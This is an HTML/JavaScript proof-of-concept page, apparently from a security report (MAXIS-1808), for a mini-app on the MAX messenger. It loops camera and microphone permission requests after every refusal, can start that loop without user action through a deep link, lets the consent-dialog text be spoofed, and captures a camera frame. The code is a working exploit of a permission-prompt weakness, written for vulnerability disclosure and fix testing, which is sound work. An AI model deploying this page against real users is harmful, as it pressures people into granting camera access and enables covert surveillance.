<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SpyCam MiniApp (PoC MAXIS-1808)</title>
  <style>
  body { font-family: -apple-system, system-ui, sans-serif; margin: 0; background: #111; color: #eee; padding: 16px; }
  h1 { font-size: 18px; } h2 { font-size: 15px; margin: 20px 0 8px; }
  .card { background: #1c1c1e; border: 1px solid #333; border-radius: 12px; padding: 12px; margin-bottom: 12px; }
  button { display: block; width: 100%; box-sizing: border-box; padding: 14px; margin: 6px 0; border-radius: 12px;
           border: 0; font-size: 16px; font-weight: 600; }
  .primary { background: #0a84ff; color: #fff; }
  .danger  { background: #ff453a; color: #fff; }
  .muted   { background: #333; color: #ccc; }
  pre { background: #000; border-radius: 8px; padding: 10px; font-size: 11px; max-height: 200px;
        overflow: auto; white-space: pre-wrap; word-break: break-all; }
  .stat { display: flex; gap: 8px; }
  .stat > div { flex: 1; background: #000; border-radius: 8px; padding: 8px; text-align: center; }
  .stat b { display: block; font-size: 22px; }
  label { display: block; margin: 8px 0 2px; font-size: 13px; color: #999; }
  input[type=text], select { width: 100%; box-sizing: border-box; padding: 10px; border-radius: 8px;
        border: 1px solid #444; background: #000; color: #eee; font-size: 14px; }
  .warn { color: #ffd60a; font-size: 12px; }
  .ok { color: #30d158; } .bad { color: #ff453a; }
  video { width: 100%; border-radius: 12px; background: #000; }
  </style>

  <!--
    ВАЖНО: max-web-app.mjs НЕ вешает свой API на window.WebApp — туда попадает
    только заглушка { sendEvent } (её вызывает нативный клиент для доставки ответов).
    Полный API (PermissionsManager, requestController, ...) — это default export
    модуля. Поэтому импортируем его явно и кладём в глобальную переменную,
    доступную обычным (не-module) скриптам ниже.
  -->
  <script type="module">
    import WebAppFull from './max-web-app.mjs';
    window.WebAppFull = WebAppFull;
    window.dispatchEvent(new Event('webapp-sdk-ready'));
  </script>
</head>

<body>
  <h2>Smile for the camera 😈</h2>
  <div id="bridge-status" class="warn">bridge: загрузка SDK…</div>

  <button class="primary" onclick="capture()">Start Camera Capture with getUserMedia</button>
  <button class="muted" onclick="RequestOnce()">Single call (по выбранному методу)</button>

  <div class="card">
    <h2>Управление циклом (M-2)</h2>
    <button class="primary" id="btn-start" onclick="startLoop()">Запустить цикл</button>
    <button class="danger" id="btn-stop" onclick="stopLoop()" disabled>Остановить</button>
    <label>Метод спама
      <select id="mode">
        <option value="request" selected>requestAccess</option>
        <option value="max">openMaxSettings</option>
        <option value="sys">openSystemSettings</option>
        <option value="alt">чередование requestAccess / openMaxSettings</option>
      </select>
    </label>
    <label>Пауза между запросами, мс (0 = сразу после ответа)
      <input type="text" id="delay" value="0" inputmode="numeric" />
    </label>
    <label>reason (текст в диалоге согласия — вектор L-2; только для requestAccess)
      <input type="text" id="reason" value="[PoC MAXIS-1808] Подтвердите доступ к камере для продолжения видеосвязи" />
    </label>
    <label>Разрешения (только для requestAccess)
      <select id="perms">
        <option value="camera" selected>camera</option>
        <option value="mic">mic</option>
        <option value="both">camera + mic</option>
      </select>
    </label>
  </div>

  <div class="card">
    <h2>Статус цикла</h2>
    <div class="stat">
      <div><b id="n-iter">0</b>итераций</div>
      <div><b id="n-denied">0</b>отказов</div>
      <div><b id="n-granted">—</b>доступ</div>
    </div>
  </div>

  <div class="card">
    <h2>Лог</h2>
    <pre id="log"></pre>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display: none;"></canvas>
  <img id="photo" alt="Captured image will appear here" style="width:100%;border-radius:12px;" />

<script>
  'use strict';

  // ---- лог/статус ----
  function log(msg) {
    var t = new Date().toISOString().substr(11, 12);
    var el = document.getElementById('log');
    el.textContent = '[' + t + '] ' + msg + '\n' + el.textContent;
    if (el.textContent.length > 20000) el.textContent = el.textContent.substr(0, 20000);
  }
  var nIter = 0, nDenied = 0, running = false;
  function stat() {
    document.getElementById('n-iter').textContent = nIter;
    document.getElementById('n-denied').textContent = nDenied;
  }

  function updateBridgeStatus() {
    var el = document.getElementById('bridge-status');
    var sdk = window.WebAppFull;
    if (sdk && sdk.PermissionsManager) {
      el.textContent = 'bridge: WebAppFull.PermissionsManager доступен (platform: ' + (sdk.platform || '?') + ')';
      el.className = 'ok';
    } else if (sdk) {
      el.textContent = 'bridge: SDK загружен, но PermissionsManager отсутствует';
      el.className = 'bad';
    }
  }

  // ---- режимы ----
  // Автостарт может прийти двумя путями:
  //  1) ?autostart=1 / ?autostart=max / ?autostart=sys / ?autostart=alt в query страницы;
  //  2) стартовый параметр запуска — приходит в WebAppData (location hash),
  //     SDK парсит его в initDataUnsafe.start_param:
  //     https://max.ru/tostertostbot?startapp=autostart | autostart-max | autostart-sys | autostart-alt
  var AUTOSTART_MODES = {
    'autostart': 'request', 'autostart-max': 'max', 'autostart-sys': 'sys', 'autostart-alt': 'alt',
    '1': 'request', 'true': 'request'
  };

  function currentMode() { return document.getElementById('mode').value; }
  function setMode(m) {
    var sel = document.getElementById('mode');
    for (var i = 0; i < sel.options.length; i++) {
      if (sel.options[i].value === m) { sel.value = m; return; }
    }
  }

  function autostartSource() {
    var q = new URLSearchParams(location.search).get('autostart');
    if (q) {
      var key = q.replace(/=1$/, '');
      if (AUTOSTART_MODES[key]) {
        setMode(AUTOSTART_MODES[key]);
        return 'query:"' + q + '"';
      }
    }
    var sdk = window.WebAppFull;
    var sp = sdk && sdk.initDataUnsafe && sdk.initDataUnsafe.start_param;
    if (sp) {
      var k = sp.replace(/=1$/, '');
      if (AUTOSTART_MODES[k]) {
        setMode(AUTOSTART_MODES[k]);
        return 'start_param:"' + sp + '"';
      }
    }
    return null;
  }

  window.addEventListener('webapp-sdk-ready', function () {
    updateBridgeStatus();
    var src = autostartSource();
    if (src) {
      log('autostart (' + src + ', mode=' + currentMode() + '): запуск цикла без user gesture…');
      startLoop();
    }
  });
  setTimeout(function () {
    updateBridgeStatus();
    // Фолбэк: если событие sdk-ready уже успело пройти мимо листенера
    var src = autostartSource();
    if (src && !running && !document.getElementById('btn-start').disabled) {
      log('autostart (fallback, ' + src + ', mode=' + currentMode() + '): запуск цикла без user gesture…');
      startLoop();
    }
  }, 2500);

  function getPM() {
    var sdk = window.WebAppFull;
    return sdk && sdk.PermissionsManager;
  }

  // SDK кидает НЕ Error, а { error: { code } } — форматируем аккуратно
  function errText(e) {
    if (e && e.error && e.error.code) return e.error.code;
    if (e && e.code) return e.code;
    return (e && e.message) ? e.message : JSON.stringify(e);
  }

  function permsArray() {
    var v = document.getElementById('perms').value;
    return v === 'both' ? ['camera', 'mic'] : [v];
  }

  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  var lastInitError = '';

  // Классификация кода ошибки:
  //  'denied' — отказ ПОЛЬЗОВАТЕЛЯ (продолжаем цикл — это и есть M-2);
  //  'already' — все доступы уже выданы (already_enabled), смысла дальше нет;
  //  'env'     — ошибка окружения (not_inited / not_found / request_timeout /
  //              not_supported / выключенный тоггл) — цикл останавливаем.
  function classifyError(code) {
    code = String(code);
    if (/_permission_denied$/.test(code)) return 'denied';
    if (/already_enabled$/.test(code)) return 'already';
    // refused: в режимах настроек это отказ пользователя от перехода в настройки;
    // в режиме requestAccess — выключенный фиче-тоггл (ошибка окружения)
    if (/refused$/.test(code) && currentMode() !== 'request') return 'denied';
    return 'env';
  }

  async function ensureInit(pm, attempts) {
    for (var i = 1; i <= attempts; i++) {
      try {
        await pm.init();
        lastInitError = '';
        return true;
      } catch (e) {
        lastInitError = errText(e);
        log('init() попытка ' + i + '/' + attempts + ' — ошибка: ' + lastInitError);
        if (i < attempts) await sleep(1500);
      }
    }
    return false;
  }

  function initErrorHint() {
    if (/request_timeout/.test(lastInitError)) return 'Запрос не дошёл/нет ответа — страница открыта вне клиента MAX (транспорт sendFallback) или bridge ещё не готов.';
    if (/refused/.test(lastInitError)) return 'Клиент вернул refused — скорее всего выключен фиче-тоггл webapp-video-stream на этой сборке.';
    if (/not_found/.test(lastInitError)) return 'Клиент вернул not_found — queryId из WebAppData не совпал с queryId текущего запуска.';
    return 'См. код ошибки выше.';
  }

  // Один вызов выбранного метода. Возвращает { outcome, code, res }:
  //  granted  — доступ выдан (requestAccess);
  //  opened   — пользователь перешёл в настройки (miniapp закроется);
  //  already  — already_enabled;
  //  denied   — отказ пользователя (продолжаем);
  //  env      — ошибка окружения (стоп).
  var altFlip = false;

  async function callOnce(pm, reason) {
    var mode = currentMode();
    // в режиме 'alt' чередуем requestAccess и openMaxSettings
    var useSettings = mode === 'max' || mode === 'sys' ||
                      (mode === 'alt' && (altFlip = !altFlip));
    try {
      if (!useSettings) {
        var res = await pm.requestAccess(permsArray(), reason);
        var granted = res && (res.camera.appAccessGranted || res.mic.appAccessGranted);
        return { outcome: granted ? 'granted' : 'denied', code: granted ? '' : 'no_access_in_response', res: res };
      }
      var r = (mode === 'sys') ? await pm.openSystemSettings() : await pm.openMaxSettings();
      return { outcome: 'opened', code: '', res: r };
    } catch (e) {
      var code = errText(e);
      return { outcome: classifyError(code), code: code, res: null };
    }
  }

  // ---- одиночный вызов ----
  async function RequestOnce() {
    var pm = getPM();
    if (!pm) { log('bridge недоступен: SDK ещё не загружен или открыт вне клиента MAX'); return; }
    var reason = document.getElementById('reason').value || undefined;
    if (!await ensureInit(pm, 1)) { log('init() не удался: ' + initErrorHint()); return; }
    log('init() ok, camera.appAccessGranted=' + pm.isCameraAppAccessGranted);
    var r = await callOnce(pm, reason);
    log('одиночный ' + currentMode() + ': outcome=' + r.outcome +
        (r.code ? ' code=' + r.code : '') + ' ' + JSON.stringify(r.res));
  }

  // ---- цикл M-2: немедленный повтор после каждого отказа ----
  var MAX_ITER = 200; // предохранитель: после фикса цикл будет крутиться вхолостую

  async function loop() {
    if (!running) return;
    if (nIter >= MAX_ITER) {
      log('Достигнут лимит ' + MAX_ITER + ' итераций — цикл остановлен. ' +
          'Если ни одного диалога не показано — фикса M-2 работает (PASS).');
      stopLoop();
      return;
    }
    nIter++; stat();
    var pm = getPM();
    var reason = document.getElementById('reason').value || undefined;
    var r = await callOnce(pm, reason);

    if (r.outcome === 'granted') {
      document.getElementById('n-granted').textContent = 'выдан';
      log('ИТЕРАЦИЯ ' + nIter + ': ДОСТУП ВЫДАН — цикл остановлен.');
      stopLoop();
      return;
    }
    if (r.outcome === 'opened') {
      log('ИТЕРАЦИЯ ' + nIter + ': пользователь перешёл в настройки — мини-апп закроется, цикл остановлен.');
      stopLoop();
      return;
    }
    if (r.outcome === 'already') {
      document.getElementById('n-granted').textContent = 'выдан';
      log('ИТЕРАЦИЯ ' + nIter + ': already_enabled — все доступы уже выданы, цикл остановлен.');
      stopLoop();
      return;
    }
    if (r.outcome === 'denied') {
      nDenied++; stat();
      log('ИТЕРАЦИЯ ' + nIter + ': отказ (' + (r.code || 'без кода') + ') → повторный запрос.');
    } else {
      log('ИТЕРАЦИЯ ' + nIter + ': ошибка окружения (' + r.code + ') — НЕ отказ пользователя, цикл остановлен.');
      stopLoop();
      return;
    }

    var d = parseInt(document.getElementById('delay').value, 10) || 0;
    await sleep(d);
    loop();
  }

  async function startLoop() {
    var pm = getPM();
    if (!pm) { log('bridge недоступен: SDK ещё не загружен или открыт вне клиента MAX'); return; }

    // Диагностика окружения (значения не логируем, только факт наличия)
    var sdk = window.WebAppFull;
    log('platform=' + (sdk.platform || '?') +
        ', query_id=' + (sdk.initDataUnsafe && sdk.initDataUnsafe.query_id ? 'есть' : 'ОТСУТСТВУЕТ') +
        ', start_param=' + JSON.stringify((sdk.initDataUnsafe && sdk.initDataUnsafe.start_param) || null) +
        ', mode=' + currentMode());

    // Без успешного init() цикл не запускаем: методы без него всегда not_inited
    if (!await ensureInit(pm, 3)) {
      log('init() не удался — цикл НЕ запущен. ' + initErrorHint());
      return;
    }
    log('init() ok. Старт цикла (' + currentMode() + '): жмите «Отмена» в диалогах.');
    running = true;
    document.getElementById('btn-start').disabled = true;
    document.getElementById('btn-stop').disabled = false;
    loop();
  }

  function stopLoop() {
    running = false;
    document.getElementById('btn-start').disabled = false;
    document.getElementById('btn-stop').disabled = true;
    log('Цикл остановлен. Итераций: ' + nIter + ', отказов: ' + nDenied + '.');
  }

  // ---- захват кадра (демонстрация результата доступа) ----
  async function capture() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById('video');
      video.srcObject = stream;

      await new Promise(resolve => video.onloadedmetadata = resolve);
      await new Promise(res => setTimeout(res, 700));

      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      stream.getTracks().forEach(track => track.stop());

      const photo = document.getElementById('photo');
      photo.src = canvas.toDataURL('image/png');
      video.style.display = 'none';
      log('getUserMedia: кадр захвачен (доступ к камере активен).');
    } catch (err) {
      log('getUserMedia ошибка: ' + (err && err.name ? err.name + ': ' + err.message : err));
      console.error(err);
    }
  }
</script>
</body>
</html>
